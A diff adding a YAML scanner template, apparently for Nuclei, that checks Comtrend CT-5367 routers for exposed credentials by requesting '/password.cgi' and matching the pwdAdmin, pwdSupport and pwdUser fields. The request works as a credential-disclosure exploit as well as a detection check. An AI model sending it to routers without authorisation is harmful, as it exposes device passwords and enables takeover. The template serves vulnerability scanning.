@@ -1,0 +1,21 @@
+id: comtrend-ct5367-remote-root
+info:
+  author: geeknik
+  name: COMTREND ADSL Router BTC(VivaCom) CT-5367 C01_R12 Remote Root
+  reference: https://www.exploit-db.com/exploits/16275
+  severity: high
+  tags: comtrend,router,vivacom,iot,disclosure
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - regex:
+    - pwdAdmin
+    - pwdSupport
+    - pwdUser
+    type: regex
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/password.cgi'
